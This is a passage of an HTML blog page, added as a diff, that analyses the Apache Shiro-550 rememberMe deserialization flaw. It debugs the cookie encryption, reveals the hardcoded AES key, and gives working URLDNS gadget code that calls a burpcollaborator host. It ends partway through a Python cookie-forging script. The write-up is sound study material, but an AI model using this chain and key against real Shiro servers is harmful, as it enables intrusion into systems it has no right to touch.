@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="作者：Narcher	时间：2024&#x2F;3&#x2F;23	分类：Vulnerability Analysis">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JAVA安全:Shiro-550反序列化">
+<meta property="og:url" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Narcherの小窝">
+<meta property="og:description" content="作者：Narcher	时间：2024&#x2F;3&#x2F;23	分类：Vulnerability Analysis">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710984978093.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710985093595.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711002884950.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710985507053.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710985773507.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710986058301.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710986269057.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710986430909.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710986500638.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710986670678.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710987965249.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710988133694.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710989637276.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710989372541.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710989398262.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710989422395.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710990026308.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710990294364.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710991426004.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711022197020.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711022756959.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711023002495.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711023436152.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711023527657.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711023604785.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711023811540.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711105808591.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711099895450.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711109384042.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711199986851.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711200210269.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711201185415.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711200539928.png">
+<meta property="og:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711201791201.png">
+<meta property="article:published_time" content="2024-12-22T08:38:23.503Z">
+<meta property="article:modified_time" content="2024-03-23T14:03:34.190Z">
+<meta property="article:author" content="Narcher Alter">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710984978093.png">
+
+<link rel="canonical" href="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>JAVA安全:Shiro-550反序列化 | Narcherの小窝</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Narcherの小窝</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Narcher Alter">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Narcherの小窝">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          JAVA安全:Shiro-550反序列化
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2024-12-22 16:38:23" itemprop="dateCreated datePublished" datetime="2024-12-22T16:38:23+08:00">2024-12-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-03-23 22:03:34" itemprop="dateModified" datetime="2024-03-23T22:03:34+08:00">2024-03-23</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><em>作者：Narcher</em>	<em>时间：2024&#x2F;3&#x2F;23</em>	<em>分类：Vulnerability Analysis</em></p>
+<span id="more"></span>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Apache Shiro是一个开源的Java安全框架，可执行身份验证、授权、密码和会话管理。Shiro-550的漏洞最早披露于2016年，影响版本为：shiro&lt;1.2.4，特征：返回包的http头中包含Set-Cookie: rememberMe&#x3D;deleteMe</p>
+<p>emmm….直接开始学习吧</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h3><p>&lt;1&gt;直接下载shiro-1.2.4</p>
+<p><a target="_blank" rel="noopener" href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a></p>
+<p>&lt;2&gt;打开IDEA，将shiro-shiro-root-1.2.4的samples下的web包以Maven的形式导入即可</p>
+<p>&lt;3&gt;更改pom.xml文件中的jstl配置，增加1.2版本设置，如下：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710984978093.png" alt="1710984978093" style="zoom:67%;">
+
+<p>&lt;4&gt;配置好IDEA内置的tomcat服务，启动即可，成功后效果如下：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710985093595.png" alt="1710985093595" style="zoom: 33%;">
+
+<h3 id="2-调试"><a href="#2-调试" class="headerlink" title="2.调试"></a>2.调试</h3><p>Shiro的加解密实际上是一对，从名字也很容易看出来：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711002884950.png" alt="1711002884950" style="zoom:50%;">
+
+<h4 id="2-1-加密分析"><a href="#2-1-加密分析" class="headerlink" title="2.1 加密分析"></a>2.1 加密分析</h4><p>直接把断点打在org.apache.shiro.mgt.AbstractRememberMeManager类的onSuccessfulLogin方法中：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710985507053.png" alt="1710985507053" style="zoom:67%;">
+
+<p>然后我们开始调试运行，登录root:secret账号，并勾选RememberMe选项，点击Login，转入IDEA开始分析</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710985773507.png" alt="1710985773507" style="zoom: 50%;">
+
+<p>可见程序停在了我们的断点处，我们继续跟进：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710986058301.png" alt="1710986058301" style="zoom:67%;">
+
+<p>此时进入了rememberIdentity方法，我们继续跟进：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710986269057.png" alt="1710986269057" style="zoom:67%;">
+
+<p>在getIdentityToRemember方法中返回了用户名root，并给principals赋值，接着进入重写的rememberIdentity方法：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710986430909.png" alt="1710986430909" style="zoom:67%;">
+
+<p>到这一步就开始对用户名root进行操作了，我们继续跟进：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710986500638.png" alt="1710986500638" style="zoom: 67%;">
+
+<p>可见这里对root进行了序列化，并赋值给字节数组，之后在encrypt中进行加密操作，我们继续跟进：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710986670678.png" alt="1710986670678" style="zoom: 67%;">
+
+<p>进入encrypt方法之后，看起来像是对序列化之后的用户名进行了加密操作，我们来看一下cipherService：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710987965249.png" alt="1710987965249" style="zoom:50%;">
+
+<p>很明显，对序列化之后的用户名进行了AES加密，我们跟进来看一下AES加密的Key值：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710988133694.png" alt="1710988133694" style="zoom:67%;">
+
+<p>这个encryptionCipherKey的赋值可以看一下：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710989637276.png" alt="1710989637276" style="zoom:67%;">
+
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710989372541.png" alt="1710989372541" style="zoom:67%;">
+
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710989398262.png" alt="1710989398262" style="zoom:67%;">
+
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710989422395.png" alt="1710989422395" style="zoom:67%;">
+
+<p>可见Key实际上就是一个固定的值：<code>kPH+bIxk5D2deZiIxcaaaA==</code>的base64解码</p>
+<p>确定了AES加密的Key之后我们继续跟进，之后便是一系列的加密过程，我们在这里直接省略，直接看加密完成后的流程：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710990026308.png" alt="1710990026308" style="zoom: 67%;">
+
+<p>直接从convertPrincipalsToBytes方法return values回到rememberIdentity，然后我们继续跟进：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710990294364.png" alt="1710990294364" style="zoom: 50%;">
+
+<p>之后便是对加密后的值进行base64编码，然后设置到cookie之中</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710991426004.png" alt="1710991426004" style="zoom: 50%;">
+
+<p>总结流程：</p>
+<p>&lt;1&gt;用户名序列化</p>
+<p>&lt;2&gt;AES加密</p>
+<p>&lt;3&gt;base64加密</p>
+<p>&lt;4&gt;将加密结果放到cookie的rememberMe上</p>
+<h4 id="2-2-解密分析"><a href="#2-2-解密分析" class="headerlink" title="2.2 解密分析"></a>2.2 解密分析</h4><p>注意：解密的时候请求头中注意删掉JSESSIONID，否则不会进行解密流程！！！</p>
+<p>直接把断点打在org.apache.shiro.mgt.DefaultSecurityManager的getRememberedIdentity方法中：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711022197020.png" alt="1711022197020" style="zoom: 50%;">
+
+<p>这里我们重点跟进getRememberedPrincipals方法：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711022756959.png" alt="1711022756959" style="zoom: 67%;">
+
+<p>这里我们比较感兴趣的是getRememberedSerializedIdentity方法和convertBytesToPrincipals方法，我们逐个跟进一下：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711023002495.png" alt="1711023002495" style="zoom:50%;">
+
+<p>看起来很长，实际上就是进行两个主要的操作，一个是获取cookie中的base64信息，另一个就是进行base64解密并返回，我们再跟进convertBytesToPrincipals方法看一下：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711023436152.png" alt="1711023436152" style="zoom: 67%;">
+
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711023527657.png" alt="1711023527657" style="zoom: 50%;">
+
+<p>可以看到就是一个AES解密加一个反序列化，最终返回我们的用户名root</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711023604785.png" alt="1711023604785" style="zoom:50%;">
+
+<p>可见以root的身份登录：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711023811540.png" alt="1711023811540" style="zoom: 50%;">
+
+<p>总结流程：</p>
+<p>&lt;1&gt;读取cookie中的rememberMe的值</p>
+<p>&lt;2&gt;对值进行base64解密</p>
+<p>&lt;3&gt;对解密结果进行AES解密+反序列化得到用户名</p>
+<h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h3><p>解密流程中对cookie中的rememberMe的值最终进行了反序列化操作，那么我们只要传入前边学过的反序列化触发的链子便可以进行命令执行</p>
+<h4 id="3-1-URLDNS链"><a href="#3-1-URLDNS链" class="headerlink" title="3.1 URLDNS链"></a>3.1 URLDNS链</h4><p>由于URLDNS链基本上都是用的Java内置类实现的，所以应用范围较广，但也就只能用来发起DNS请求，我们来试一下：</p>
+<p>这里我直接把之前学的URLDNS链原封不动拿过来了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://ob328eym9gl464dbs50lp5unwe24qt.burpcollaborator.net&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">hashcode</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">hashcode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">hashcode.set(url,<span class="number">1</span>);</span><br><span class="line">hashMap.put(url,<span class="number">1</span>);</span><br><span class="line">hashcode.set(url,-<span class="number">1</span>);</span><br><span class="line"><span class="comment">//序列化</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;C:\\Users\\Narcher\\IdeaProjects\\URLDNS.txt&quot;</span>));</span><br><span class="line">oos.writeObject(hashMap);</span><br></pre></td></tr></table></figure>
+
+<p>之后就是对序列化后的数据进行AES加密和base64加密：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;URLDNS.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % 